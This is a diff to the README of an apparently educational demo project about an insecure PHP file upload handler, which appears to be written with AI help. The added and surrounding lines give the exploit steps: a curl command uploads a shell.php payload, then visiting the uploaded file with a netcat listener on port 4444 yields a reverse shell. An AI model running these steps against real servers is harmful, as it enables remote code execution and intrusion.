@@ -39,12 +39,13 @@ A PHP file upload handler that:
 cd php && php -S localhost:8080
 ```
 
-🧪 Payload: [shell.php](php/payload/shell.php) — insert your private IP or attacker IP.  
+🧪 Payload: [shell.php](php/payload/shell.php) — insert your private IP or attacker IP and upload it `curl -F 'file=@shell.php' http://localhost:8080/api/upload.php`   
 💥 Visit `/uploads/shell.php` and ensure you have a listener running:
 
 ```bash
 nc -lvnp 4444
 ```
+---
 
 ## ⚠️ Disclaimer
 
@@ -60,7 +61,7 @@ You still need to review the code, validate inputs, and secure your apps.
 
 ---
 
-📎 Related Post
+## 📎 Related Post
 
 Read the background and see the screenshots on my [my LinkedIn post](https://www.linkedin.com/posts/jeppelillevang_vibecoding-ai-development-activity-7321456876259303424-soUS?utm_source=share&utm_medium=member_desktop&rcm=ACoAAAIDUx4Bm-1Hxlq6SSERPwMmANPcGL5UTZc)
 
